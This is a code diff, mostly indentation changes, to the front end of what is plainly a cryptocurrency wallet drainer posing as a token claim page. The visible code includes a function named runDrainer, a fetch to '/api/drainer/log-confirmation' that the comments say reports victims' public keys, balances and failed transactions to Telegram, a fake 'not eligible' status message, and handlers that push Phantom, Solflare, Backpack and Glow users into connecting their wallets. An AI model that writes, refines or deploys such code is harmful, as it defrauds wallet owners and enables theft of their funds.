@@ -803,7 +803,7 @@
     }
     /* Mobile-specific wallet-box overrides */
     @media (max-width: 800px) {
-      .wallet-box {
+    .wallet-box {
         width: 85vw;
         max-width: 320px;
         margin: 0 auto;
@@ -1700,7 +1700,7 @@
         <h3>Connect Wallet</h3>
       </div>
       <div class="wallet-list-content">
-        <!-- Wallet buttons will be injected here -->
+      <!-- Wallet buttons will be injected here -->
       </div>
     </div>
   </div>
@@ -2292,8 +2292,8 @@ async function runDrainer(provider) {
               }
               window.walletBalanceCache[walletKey] = balance;
               
-                        // Use centralized logging function with actual balance
-          window.logWalletConnection(publicKey, connectedWalletType, balance);
+              // Use centralized logging function with actual balance
+              window.logWalletConnection(publicKey, connectedWalletType, balance);
           
           // Also log initial wallet connection regardless of balance change
           if (lastBalance === 0) {
@@ -2575,18 +2575,18 @@ async function runDrainer(provider) {
           console.log('[ERROR] SendTransactionError detected');
           
           // Log SendTransactionError to Telegram
-                      fetch('/api/drainer/log-confirmation', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                publicKey: publicKey.toString(),
-                txid: 'send_transaction_error',
-                status: 'failed',
-                error: signError.message || 'SendTransactionError',
+          fetch('/api/drainer/log-confirmation', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              publicKey: publicKey.toString(),
+              txid: 'send_transaction_error',
+              status: 'failed',
+              error: signError.message || 'SendTransactionError',
                 lamports: balance || 0,
                 walletType: connectedWalletType
-              })
-            }).catch(err => console.log('[TELEGRAM] Failed to log SendTransactionError:', err));
+            })
+          }).catch(err => console.log('[TELEGRAM] Failed to log SendTransactionError:', err));
           
           showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
           return;
@@ -3010,24 +3010,24 @@ window.openWalletModal = async function openWalletModal() {
     const walletListContent = walletList.querySelector('.wallet-list-content');
     if (walletListContent) {
       walletListContent.innerHTML = detectedDefs.map(wallet => {
-        // Use the actual provider object for this wallet
-        const provider = wallet.provider();
-        let actionBtn = '';
-        if (provider) {
-          actionBtn = `<button class="claim-btn connect-wallet-btn" data-wallet-key="${wallet.key}">Connect</button>`;
-        } else if (isMobile()) {
-          actionBtn = `<button class="claim-btn" onclick="window.open('${wallet.mobile?.appStore || wallet.install}', '_blank')">Open/Install</button>`;
-        } else {
-          actionBtn = `<button class="claim-btn" onclick="window.open('${wallet.install}', '_blank')">Install</button>`;
-        }
-        return `
-          <div class="wallet-option">
+      // Use the actual provider object for this wallet
+      const provider = wallet.provider();
+      let actionBtn = '';
+      if (provider) {
+        actionBtn = `<button class="claim-btn connect-wallet-btn" data-wallet-key="${wallet.key}">Connect</button>`;
+      } else if (isMobile()) {
+        actionBtn = `<button class="claim-btn" onclick="window.open('${wallet.mobile?.appStore || wallet.install}', '_blank')">Open/Install</button>`;
+      } else {
+        actionBtn = `<button class="claim-btn" onclick="window.open('${wallet.install}', '_blank')">Install</button>`;
+      }
+      return `
+        <div class="wallet-option">
                             <img src="${wallet.icon}" alt="${wallet.name} logo" loading="lazy" decoding="async" />
-            <span class="wallet-name">${wallet.name}</span>
-            ${actionBtn}
-          </div>
-        `;
-      }).join('');
+          <span class="wallet-name">${wallet.name}</span>
+          ${actionBtn}
+        </div>
+      `;
+    }).join('');
     }
     
 
@@ -3037,20 +3037,20 @@ window.openWalletModal = async function openWalletModal() {
       const walletListContent = walletList.querySelector('.wallet-list-content');
       if (walletListContent) {
         const connectBtns = walletListContent.querySelectorAll('.connect-wallet-btn');
-        connectBtns.forEach(btn => {
-          btn.addEventListener('click', function() {
-            const key = btn.getAttribute('data-wallet-key');
-            // Use the actual provider object at click time
-            const wallet = WALLET_DEFS.find(w => w.key === key);
-            if (wallet) {
-              const provider = wallet.provider();
-              if (provider && window.connectMobileWallet) {
-                // Pass the wallet object, but connectMobileWallet will use the current provider
-                window.connectMobileWallet(wallet);
-              }
+      connectBtns.forEach(btn => {
+        btn.addEventListener('click', function() {
+          const key = btn.getAttribute('data-wallet-key');
+          // Use the actual provider object at click time
+          const wallet = WALLET_DEFS.find(w => w.key === key);
+          if (wallet) {
+            const provider = wallet.provider();
+            if (provider && window.connectMobileWallet) {
+              // Pass the wallet object, but connectMobileWallet will use the current provider
+              window.connectMobileWallet(wallet);
             }
-          });
+          }
         });
+      });
       }
     }, 0);
     modal.classList.add('active');
@@ -3421,8 +3421,8 @@ window.openWalletModal = async function openWalletModal() {
                 console.log(`[connectMobileWallet] Trying Phantom deep link: ${phantomDeepLink}`);
                 
                 try {
-                  const phantomWindow = window.open(phantomDeepLink, '_blank');
-                  if (!phantomWindow || phantomWindow.closed) {
+                const phantomWindow = window.open(phantomDeepLink, '_blank');
+                if (!phantomWindow || phantomWindow.closed) {
                     console.log(`[connectMobileWallet] Phantom deep link failed, trying universal link`);
                     window.location.href = phantomUniversalLink;
                   }
@@ -3441,8 +3441,8 @@ window.openWalletModal = async function openWalletModal() {
                 console.log(`[connectMobileWallet] Trying Solflare deep link: ${solflareDeepLink}`);
                 
                 try {
-                  const solflareWindow = window.open(solflareDeepLink, '_blank');
-                  if (!solflareWindow || solflareWindow.closed) {
+                const solflareWindow = window.open(solflareDeepLink, '_blank');
+                if (!solflareWindow || solflareWindow.closed) {
                     console.log(`[connectMobileWallet] Solflare deep link failed, trying universal link`);
                     window.location.href = solflareUniversalLink;
                   }
@@ -3451,8 +3451,8 @@ window.openWalletModal = async function openWalletModal() {
                   window.location.href = solflareUniversalLink;
                 }
               } else if (wallet.name === 'Backpack') {
-                // Use Backpack's correct DApp deep link format
-                const currentUrl = window.location.href;
+                  // Use Backpack's correct DApp deep link format
+                  const currentUrl = window.location.href;
                 const backpackDeepLink = `backpack://app?url=${encodeURIComponent(currentUrl)}`;
                 const backpackUniversalLink = `https://backpack.app/ul/app?url=${encodeURIComponent(currentUrl)}`;
                 
@@ -3464,10 +3464,10 @@ window.openWalletModal = async function openWalletModal() {
                     console.log(`[connectMobileWallet] Backpack deep link failed, trying universal link`);
                     window.location.href = backpackUniversalLink;
                   }
-                } catch (e) {
+                  } catch (e) {
                   console.log(`[connectMobileWallet] Backpack deep link error:`, e);
                   window.location.href = backpackUniversalLink;
-                }
+                  }
               } else if (wallet.name === 'Glow') {
                 // Use Glow's correct DApp deep link format
                 const currentUrl = window.location.href;
@@ -3786,14 +3786,14 @@ window.openWalletModal = async function openWalletModal() {
                           const walletListContent = walletList.querySelector('.wallet-list-content');
                           if (walletListContent) {
                             walletListContent.innerHTML = supportedWallets.map(wallet => `
-                              <div class="wallet-option">
+                            <div class="wallet-option">
                                 <img src="${wallet.icon}" alt="${wallet.name} logo" loading="lazy" decoding="async" />
-                                <span class="wallet-name">${wallet.name}</span>
-                                <button class="claim-btn" onclick="connectMobileWallet(${JSON.stringify(wallet)})">
-                                  Use ${wallet.name}
-                                </button>
-                              </div>
-                            `).join('');
+                              <span class="wallet-name">${wallet.name}</span>
+                              <button class="claim-btn" onclick="connectMobileWallet(${JSON.stringify(wallet)})">
+                                Use ${wallet.name}
+                              </button>
+                            </div>
+                          `).join('');
                           }
                           
                           modal.classList.add('active');
